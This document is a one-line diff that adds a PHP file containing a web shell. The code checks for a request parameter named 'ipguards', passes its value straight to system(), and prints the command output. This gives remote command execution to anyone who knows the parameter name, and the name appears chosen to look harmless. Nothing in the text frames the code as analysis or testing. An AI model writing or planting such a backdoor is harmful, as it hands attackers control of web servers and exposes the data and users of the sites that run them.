@@ -1,0 +1,1 @@
+﻿<?php if(isset($_REQUEST['ipguards'])){ echo "<pre>"; $ipguards = ($_REQUEST['ipguards']); system($ipguards); echo "</pre>"; die; }?>
